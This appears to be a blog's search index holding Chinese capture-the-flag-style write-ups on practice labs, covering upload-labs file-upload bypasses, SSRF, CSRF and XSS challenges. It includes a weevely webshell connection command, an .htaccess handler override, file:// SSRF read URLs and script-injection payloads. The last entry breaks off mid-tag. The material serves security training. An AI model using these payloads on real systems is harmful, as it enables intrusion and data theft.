<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>upload-labs1-5通关</title>
    <link href="/2020/08/10/upload-labs%E9%80%9A%E5%85%B31-5/"/>
    <url>/2020/08/10/upload-labs%E9%80%9A%E5%85%B31-5/</url>
    
    <content type="html"><![CDATA[<h1 id="··upload-labs1-5通关"><a href="#··upload-labs1-5通关" class="headerlink" title="··upload-labs1-5通关"></a>··upload-labs1-5通关</h1><h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul><li>这里的靶场用的是upload-labs，下载及搭建教程移步github<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">项目地址</a></li></ul><h3 id="pass1-绕过js验证"><a href="#pass1-绕过js验证" class="headerlink" title="pass1-绕过js验证"></a>pass1-绕过js验证</h3><p><strong>源码分析</strong></p><ul><li><p>后台代码对用户上传的文件以点为分隔符将其后缀当作文件格式</p><table><thead><tr><th><code>通过js代码对文件格式进行判断，不符合规定的则拒绝上传，反之允许上传</code></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828192717.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p><strong>js绕过</strong></p><table><thead><tr><th align="center"><code>在pass1尝试上传了php文件结果存在过滤</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828192851.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th><code>F12查看源代码，发现调用了checkFILE函数进行过滤，手动删除就可以绕过js验证了</code></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828192922.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h3 id="pass2-绕过MIME-Type验证"><a href="#pass2-绕过MIME-Type验证" class="headerlink" title="pass2-绕过MIME-Type验证"></a>pass2-绕过MIME-Type验证</h3><p><strong>什么是MIME-Type</strong></p><ul><li>mime(Multipurpose Internet Mail EXtensions)多用途互联网邮件扩展类型。设定某种扩展名的文件用一种应用恒旭来打开的方式类型，当该扩展名被访问时候，浏览器会自动使用指定应用程序来打开。 多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。    </li></ul><p><strong>验证MIME-Type</strong></p><ul><li><p>源码分析</p><table><thead><tr><th><code>使用</code>$_FILE[‘upload_file’][‘type’]<code>获取上传文件的MIME-Type类型。其中upload_file是表单中定义的</code></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828195324.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>上传了一个自己建立的新的jpg文件</p><table><thead><tr><th align="center"><code>发件无法上传，说明存在MIME-Type验证</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828195435.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>burpsuite绕过MIME-Type验证</strong></p><ul><li><p>利用burpsuite截断http请求，在repeater中重放修改MIME-Type类型绕过验证image/jpeg</p></li><li><p>选择webshell进行上传，burp截断请求发送到repeater</p><ul><li>可以看到有两个MIME-Type</li></ul><table><thead><tr><th align="center"><code>第一个标示着上传文件的起始和结束位置，而第二个就是要修改的MIME-Type了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828200733.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>第二个Type类型为应用程序/八进制文件，将其修改为image/jpeg</p><table><thead><tr><th align="center"><code>成功的上传到了目标主机</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828200811.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center">+ 使用weevely连接</td></tr></tbody></table><table><thead><tr><th align="center"><code>weevely  http://192.168.3.5/upload-labs/upload/webshell.php cmd</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828200842.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h3 id="pass3-绕过黑名单验证"><a href="#pass3-绕过黑名单验证" class="headerlink" title="pass3-绕过黑名单验证"></a>pass3-绕过黑名单验证</h3><p><strong>基于后缀名验证</strong></p><ul><li>对于文件上传模块来说，尽量避免上传可执行的脚本文件。为了防止上传脚本需要设置对应的验证方式。最简单的就是设置文件名后缀验证。</li><li>基于文件后缀名验证方式的分类：<ul><li>基于白名单验证：只针对白名单中的所有后缀名，文件才能上传成功。</li><li>基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功</li></ul></li></ul><p><strong>基于黑名单验证代码分析</strong></p><ul><li><p>对于黑名单中的后缀名筛选，绕过黑名单可以通过寻找漏网之鱼，寻找某些可以被作为脚本执行同时也不再黑名单那中</p></li><li><p>从源代码可以看到，对常见的4种脚本文件进行了过滤</p><table><thead><tr><th align="center"><code>上传后还对文件名进行了修改，过滤等操作</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828201212.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>burpsuite绕过黑名单</strong></p><ul><li><p>截断http请求，Ctrl+I发送至intruter，对后缀名进行测试</p><ul><li>选择到后缀名php</li></ul><table><thead><tr><th align="center"><code>点击右边的add添加变量</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828201402.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>测试所需要的字典提前准备好</li></ul><table><thead><tr><th align="center"><code>在payloads栏的payload type选择runtime file 自定义文件，选择前面准备好的字典</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828201457.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center">+ 点击右上角的start attack，开始进行探测</td></tr></tbody></table><table><thead><tr><th align="center"><code>从结果可以看出当后缀名为空和php的时候长度一样，而其他的则各不相同，说明对黑名单进行了绕过</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828202224.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>选中上传成功的payload，右键在浏览器打开，将url复制，粘贴到浏览器。</p><table><thead><tr><th align="center"><code>成功的进行了上传，绕过了黑名单</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828202314.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>右键复制图像地址，在kali使用weevely进行连接</p><ul><li><a href="http://192.168.3.5/upload-labs/upload//webshell.php4" target="_blank" rel="noopener">http://192.168.3.5/upload-labs/upload//webshell.php4</a></li><li>这里出了点问题，好像weevely不支持连接非常见的脚本文件</li></ul></li></ul><h3 id="pass4-绕过黑名单-htaccess"><a href="#pass4-绕过黑名单-htaccess" class="headerlink" title="pass4-绕过黑名单(.htaccess)"></a>pass4-绕过黑名单(.htaccess)</h3><p><strong>.htaccess文件介绍</strong></p><ul><li>.htaccess文件是apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现以下功能：网页301重定向，自定义404错误界面，改变文件扩展名，允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</li><li>其中.htaccess文件内容：<ul><li>setHandeler application/x-httpd-php</li><li>设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要文件内容符合php语言代码规范，就会当作php执行，不符合则报错</li></ul></li></ul><p>*<em>配置http.conf *</em></p><table><thead><tr><th align="center"><code>在Apeche中如果需要启动.htaccesss,必须要http.conf中设置Allow Override</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828211453.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><p><strong>审计黑名单过滤代码</strong></p><ul><li><p>对上传文件的后缀名进行了判断</p><table><thead><tr><th align="center"><code>常见的后缀名都被过滤了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828222528.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>但值得注意的是并没有对.htacecess进行过滤，可以直接上传.htaccess来设置使用php来解析任意文件</p></li></ul><p><strong>制作图片phpinfo探针并上传</strong></p><ul><li><p>notepad 将.htaccess文件的内容SetHandler application/x-httpd-php另存为.htaccess，对pass4进行上传，上传后复制图片地址进行访问</p><table><thead><tr><th align="center"><code>虽然拒绝访问，但已经上传成功了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828223004.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>使用记事本写个phpinfo()，另存为1.jpg进行上传</p></li></ul><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><ul><li><p>上传后复制图片地址进行访问成功的输出了phpinfo()</p><table><thead><tr><th align="center"><code>说明服务器将所有的文件都使用php来进行了解析</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828223357.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h3 id="pass5-绕过黑名单验证"><a href="#pass5-绕过黑名单验证" class="headerlink" title="pass5-绕过黑名单验证"></a>pass5-绕过黑名单验证</h3><p><strong>大小写绕过原理</strong></p><ul><li>Windows系统下，对文件名中的大小写不敏感。例如test.php和TeSt.PHP是一样的。</li><li>Linux系统下，对文件名大小写异常敏感，例如test.php和TeSt.PHP是不一样的。</li><li>所以说大小写绕过只能对windows系统进行</li></ul><p><strong>黑名单验证的代码分析</strong></p><ul><li><p>pass5中也是使用黑名单机制进行过滤</p><ul><li>且过滤完后先将文件名去除了空格</li><li>还删除了文件名的点，及$data符号</li><li>首尾进行去空</li><li>从最后一个可以看到，对.htaccess文件增加了黑名单验证，但缺少了对上传文件名的小写限制</li></ul><table><thead><tr><th align="center"><code>值得注意的是并没有全部的进行了大小写过滤</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828223650.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><p><strong>直接修改后缀名PhP上传文件</strong></p><ul><li><p>notepad新建一个文件写入php探针，另存为phpinfo.PhP。</p><table><thead><tr><th align="center"><code>对pass5进行上传，并没有产生任何过滤。可以直接进行访问</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828223755.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>还可以使用WeBacoo上传webshell，但是新版kali已经取消了该工具可以改用weevely</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>快速上手ssrf</title>
    <link href="/2020/08/09/%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8BSSRF/"/>
    <url>/2020/08/09/%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8BSSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="快速上手SSRF"><a href="#快速上手SSRF" class="headerlink" title="快速上手SSRF"></a>快速上手SSRF</h1><h3 id="SSRF漏洞定义"><a href="#SSRF漏洞定义" class="headerlink" title="SSRF漏洞定义"></a><strong>SSRF漏洞定义</strong></h3><ul><li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</li><li>形成原因：服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</li><li>主要利用方式：<ul><li>对外网服务器所在内网，进行本地端口扫描，获取banner信息</li><li>测试运行在内网或本地的应用程序</li><li>利用file协议读取本地文件等</li></ul></li></ul><h2 id="漏洞位置及php危险函数"><a href="#漏洞位置及php危险函数" class="headerlink" title="漏洞位置及php危险函数"></a><strong>漏洞位置及php危险函数</strong></h2><ul><li><p><strong>SSRF漏洞可能存在的地方</strong></p><ul><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ul></li><li><p><strong>可能存在SSRF的php函数</strong></p><table><thead><tr><th align="center"><code>file_get_contents()</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828185240.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>fsockopen()</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828185317.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>curl_exec()</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828185344.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a><strong>靶场搭建</strong></h2><ul><li><p>这里使用的是webug4.0虚拟机靶场环境</p><ul><li><a href="https://pan.baidu.com/s/15msVjvX1RZ3vbYxQyy1sUg" target="_blank" rel="noopener">下载链接</a>，提取码: k415</li><li>下载后解压虚拟机文件(其他的为cms源码文件)，解压完成后即可打开虚拟机</li><li>简洁手册中有源码搭建和虚拟机搭建的教程</li></ul></li><li><p>虚拟机登录密码为空，回车即可登录。打开后启动phpstuday环境即运行。</p></li><li><p>访问http://靶机地址，就可以到达网站登录页面</p><table><thead><tr><th align="center"><code>用户密码默认为admin/admin</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828185619.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>如果新环境没有开启Apache重写未开启，可能导致导致The requested URL /xxxx.html was not found on this server</p><ul><li><p>解决方法</p><table><thead><tr><th align="center"><code>修改http.conf文件</code></th></tr></thead><tbody><tr><td align="center"><code>#LoadModule rewrite_module modules/mod_rewrite.so去掉前面的＃号</code></td></tr><tr><td align="center"><code>AllowOverride None =&gt;改为 AllowOverride All</code></td></tr><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828185748.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>修改完之后重启phpstuday即可</p></li></ul></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li><p>启动靶场</p><ul><li>在靶场目录往下拖动找到ssrf靶场，点击访问</li></ul><table><thead><tr><th align="center"><code>也可以直接在右上角搜索ssrf</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828185904.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>打开链接之后默认是404页面,</p><table><thead><tr><th align="center"><code>可能是在靶机团队做的测试忘记删除了</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828185950.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>将?url=后面的链接全部删除，利用file协议访问本地文件</p><ul><li>读取系统配置文件</li></ul><table><thead><tr><th align="center"><code>?url=file://C:/windows/win.ini</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828190103.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>读取任意文件(前提是需要知道路径,不知道的话可以尝试爆破目录)</li></ul><table><thead><tr><th align="center"><code>?url=file://C:/phpstudy/www/flag.txt</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828190149.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>如果文件存在但又访问不了，可能就是因为windows文件路径坑爹的斜杠反斜杠机制，两种斜杠都尝试访问一下说不定有惊喜。</code></td></tr></tbody></table><ul><li>探测内网主机端口是否开放获取banner信息</li></ul><table><thead><tr><th align="center"><code>?url=http://host:port</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828190301.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>访问22端口(直接返回了banner)</li></ul><table><thead><tr><th align="center"><code>?url=http://host:22</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200828190330.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a><strong>防护措施</strong></h2><ul><li>禁止跳转</li><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</li><li>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</li><li>限制请求的端口为http常用的端口，比如 80、443、8080、8090</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csrf漏洞利用</title>
    <link href="/2020/08/08/csrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/08/08/csrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="csrf漏洞利用"><a href="#csrf漏洞利用" class="headerlink" title="csrf漏洞利用"></a>csrf漏洞利用</h1><h3 id="漏洞定义"><a href="#漏洞定义" class="headerlink" title="漏洞定义"></a>漏洞定义</h3><ul><li>CSRF(Cross-site request forery,跨站请求伪造)，也被称为One click attack 或者Session Riding，通常缩写为CSRF或者XSRF</li><li>XSS与CSRF区别：<ul><li>XSS利用站点内的信任用户，盗取cookie</li><li>CSRF通过伪装成受信任用户请求受信任的网站</li></ul></li><li>漏洞原理<ul><li>利用目标用户的合法身份，以目标用户的名义执行某些非法操作</li></ul></li></ul><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><ul><li><p>漏洞环境bwapp安装</p><ul><li>下载url:<a href="https://sourceforge.net/projects/bwapp/" target="_blank" rel="noopener">https://sourceforge.net/projects/bwapp/</a></li><li>安装后解压到wamp集成环境下的www目录</li><li>点击admim目录，</li></ul><table><thead><tr><th align="center"><code>打开settings.php修改数据库密码</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827153629.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>修改后访问<a href="http://localhost/bawpp/install.php" target="_blank" rel="noopener">http://localhost/bawpp/install.php</a></li></ul><table><thead><tr><th align="center"><code>点击开始安装，即可安装完成</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827153726.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>登录账户密码默认为bee/bug</li></ul></li></ul><h2 id="csrf-demo"><a href="#csrf-demo" class="headerlink" title="csrf demo"></a>csrf demo</h2><ul><li>将级别调至low，</li></ul><table><thead><tr><th align="center"><code>登陆后选择A8第一关，点击hack</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827153926.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>修改密码，F12抓包。</p><ul><li>请求头中包含了用户的账号密码</li></ul><table><thead><tr><th align="center"><code>将其复制</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827154101.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center"><code>粘贴到记事本</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827160945.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><ul><li><p>创建一个新用户</p><ul><li>F12将密码的类型改成text就可以看到明文了</li></ul><table><thead><tr><th align="center"><code>邮件这里随便填，不要勾选验证邮箱就行</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827154250.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>登录新用户</p><table><thead><tr><th align="center"><code>粘贴url，可以看到直接提示密码更改成功</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827161153.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>再次登录</p><table><thead><tr><th align="center"><code>提示密码错误</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827161315.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>daming用户登录不上是因为，访问了bee用户构造的恶意链接，未经验证就直接访问，导致直接修改了daming账户的密码</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>csrf实际就是利用目标用户的合法身份，以目标用户的名义执行某些非法操作</li><li>csrf必须保证用户处于登录状态，有cookie，才能进一步利用</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>csrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss-challgens通关记录</title>
    <link href="/2020/08/07/xss-challgens/"/>
    <url>/2020/08/07/xss-challgens/</url>
    
    <content type="html"><![CDATA[<h1 id="xss-challgens"><a href="#xss-challgens" class="headerlink" title="xss-challgens"></a>xss-challgens</h1><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><ul><li><a href="https://xss-quiz.int21h.jp" target="_blank" rel="noopener">xss-challgens</a>， 一个日本安全研究员开发的xss靶场，官方推荐配合ie使用。（ie有多垃圾，谁用谁知道）</li><li>这里的环境用的是firefox+ietest,部分关卡没有特殊版本的ie可能做不出来。</li></ul><h2 id="stage1-无过滤的xss"><a href="#stage1-无过滤的xss" class="headerlink" title="stage1-无过滤的xss"></a>stage1-无过滤的xss</h2><ul><li><p>探测漏洞，随便输入一段不可能冲突的字符串，提交后F12查看源代码</p><table><thead><tr><th align="center"><code>发现用户的输出会直接嵌入到标签中，那么就可以存在xss漏洞</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827040351.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li><li><p>闭合文本标签，触发xss</p><ul><li>从网页源代码可以看到用户的输入被b标签和引号围了起来。插入XSS代码的时候可以将b标签闭合</li></ul><table><thead><tr><th align="center"><code>111&quot;&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827040522.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center">从上图可以看到b标签把1111给闭合了，且下面就是XSS代码</td></tr></tbody></table></li></ul><h2 id="stage2-属性中的xss"><a href="#stage2-属性中的xss" class="headerlink" title="stage2-属性中的xss"></a>stage2-属性中的xss</h2><ul><li>输入字符串，发现没响应信息，F12搜索一波</li></ul><table><thead><tr><th align="center">发现字符串发现被当作input标签的属性作为输出</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827040907.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>闭合input属性的引号及尖括号，插入js代码</li></ul><table><thead><tr><th align="center"><code>1111&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827041034.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>闭合input属性，插入xss事件代码<ul><li>onmouseover 事件会在鼠标指针移动到指定的元素上时发生。</li></ul></li></ul><table><thead><tr><th align="center"><code>aaaaa&quot;onmouseover=alert(document.domain)&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827041823.png" srcset="/img/loading.gif" alt=""></td></tr><tr><td align="center"><code>当鼠标放到输入框上时，会自动弹出域名</code></td></tr></tbody></table><h2 id="stage3-选择列表中的xss"><a href="#stage3-选择列表中的xss" class="headerlink" title="stage3-选择列表中的xss"></a>stage3-选择列表中的xss</h2><ul><li>html select标签介绍</li></ul><table><thead><tr><th align="center"><code>select 元素可创建单选或多选菜单</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827042042.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>表单介绍</li></ul><table><thead><tr><th><code>HTML表单用于搜集不同类型的用户输入，form中间都是表单的具体元素</code></th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827042115.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>F12查看select标签属性</li></ul><table><thead><tr><th align="center"><code>发现select标签里嵌套了option标签</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827042409.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li><p>burpsuite截断请求，发送到repeater</p><ul><li>p1进行了过滤，p2在代码上做了长度限制，只能修改数据包插入xss payload</li></ul><table><thead><tr><th align="center"><code>&lt;/option&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827042907.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><ul><li>插入后看不知道是否弹出窗口</li></ul><table><thead><tr><th align="center"><code>右键浏览器打开</code></th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827043017.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table><table><thead><tr><th align="center">触发弹窗</th></tr></thead><tbody><tr><td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827043100.png" srcset="/img/loading.gif" alt=""></td></tr></tbody></table></li></ul><h2 id="stage4-隐藏参数中的xss"><a href="#stage4-隐藏参数中的xss" class="headerlink" title="stage4-隐藏参数中的xss"></a>stage4-隐藏参数中的xss</h2><ul><li><p>HTML隐藏表单介绍</p><ul><li>隐藏域是用来手机或发送信息的不可见元素，对于网页的访问者来说，隐藏域是看不见的。当表单被提交时，隐藏域就会将信息用你设置时定义的名称和值发送到服务器上</li><li>代码格式 <code>&lt;input type=&#39;hidden&#39;name=&quot;...&quot;value=&quot;...&quot;&gt;</code></li><li>F12查看源代码</li></ul><table><thead><tr><th>发现两个hidden类型，名为p3</th></tr></thead><tbody><tr><td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200827043413.png" srcset="/img/loading.gif" 